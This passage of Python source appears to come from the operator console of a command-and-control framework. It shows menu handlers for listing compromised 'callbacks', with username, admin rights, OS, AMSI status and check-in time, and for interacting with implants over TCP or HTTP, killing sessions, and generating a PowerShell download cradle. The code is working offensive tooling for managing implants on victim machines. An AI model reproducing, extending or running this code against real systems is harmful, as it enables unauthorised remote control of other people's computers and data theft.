            if command == 'pwsh_cradle':
                pwsh_cradle()

            if command.split(" ")[0] == 'kill':
                if listen_type == 'TCP':
                    try:
                        num = int(command.split(" ")[1])
                        target_id = (targets[num][0])
                        if targets[num][7] == 'Active':
                            kill_signal(target_id, 'exit')
                            targets[num][7] = 'Dead'
                            print(f'[-] Session {num} terminated')
                        else:
                            print('[-] Cannot interact with a dead session')
                    except(IndexError, ValueError, NameError):
                        try:
                            print(f'Session {num} does not exist')
                        except NameError:
                            print('[-] no active sessions to kill')
                else:
                    try:
                        num = int(command.split(" ")[1])
                        target_id = (targets[num][0])
                        if targets[num][7] == 'Active':
                            kill_http(target_id, 'exit')
                            targets[num][7] = 'Dead'
                            print(f'{Fore.RED} [-] Session {num} terminated {Fore.RESET}')
                        else:
                            print('[-] Cannot interact with a dead session')
                    except(IndexError, ValueError, NameError):
                        try:
                            print(f'Session {num} does not exist')
                        except NameError:
                            print('[-] no active sessions to kill')
            
            if command.split(" ")[0] == 'callbacks':
                session_counter = 0
                
                if listen_type == 'HTTP':
                    session_table = PrettyTable()
                    session_table.field_names = [Fore.CYAN +'ID','Username', 'Admin' ,'Status' ,'Target','Operating System','AMSI','Check-in Time']
                    session_table.padding_width = 3
                    for target in targets:
                        session_table.add_row([str(session_counter) + " - " + target[0], target[3],target[4],target[7], target[1], target[5],target[8],target[2]])
                        session_counter += 1
                    print(session_table)
                else:
                    session_table = PrettyTable()
                    session_table.field_names = [Fore.CYAN +'ID','Username', 'Admin' ,'Status' ,'Target','Operating System','AMSI','Check-in Time']
                    session_table.padding_width = 3
                    for target in targets:
                        session_table.add_row([session_counter, target[3],target[4],target[7], target[1], target[5],target[8],target[2]])
                        session_counter += 1
                    print(session_table)

            if command.split(" ")[0] == 'use':
                try:
                    if listen_type == 'TCP':
                        print("RUNNING TCP interaction mode")
                        num = int(command.split(" ")[1])
                        target_id = (targets[num])[0]
                        if (targets[num])[7] == 'Active':
                            target_comm(target_id, targets, num)
                        else: 
                            print(Fore.RED +'[-] Can not interact with Dead implant')
                    elif listen_type == 'HTTP':
                        print(Fore.LIGHTYELLOW_EX + "RUNNING HTTP interaction mode" + Fore.RESET)
                        print(Fore.LIGHTYELLOW_EX + "Deafult callback interval: 5 seconds" + Fore.RESET)
                        num = int(command.split(" ")[1])
                        target_id = (targets[num])[0]
                        if (targets[num])[7] == 'Active':
                            http_target_comm(target_id, targets, num, task_queue)
                        else: 
                            print(Fore.RED +'[-] Can not interact with Dead implant')
                except (IndexError, TypeError):
                    print(f'{Fore.RED}[-] Session {num } does not exist' )
                    
            if command == 'exit':
                quit_message = input(Fore.LIGHTMAGENTA_EX + 'Ctrl-C\n[+] Do you really want to quit ? (y/n)').lower()
                if quit_message == 'y':
                    for target in targets:
                        if target[7] == 'Dead':
                            pass
                        else:
                            if listen_type == 'TCP':
                                comm_out(target[0], 'exit')
                            else:
                                if target_id not in task_queue:
                                    task_queue[target_id] = []
                                task_queue[target_id].append(command)
                    kill_flag = 1
                    if listener_count > 0:
                        sock.close()
                    break
                else:
                    continue
        except KeyboardInterrupt:
            quit_message = input(Fore.LIGHTMAGENTA_EX + 'Ctrl-C\n[+] Do you really want to quit ? (y/n)').lower()
            if quit_message == 'y':
                for target in targets:
                    if target[7] == 'Dead':
                        pass
                    else:
                        if listen_type == 'TCP':
                            comm_out(target[0], 'exit')
                        else:
                            if target_id not in task_queue:
                                task_queue[target_id] = []
                            task_queue[target_id].append(command)
                                
                            
                kill_flag = 1
                if listener_count > 0:
                    sock.close()
                break
            else:
                continue
atexit.register(exit_handler)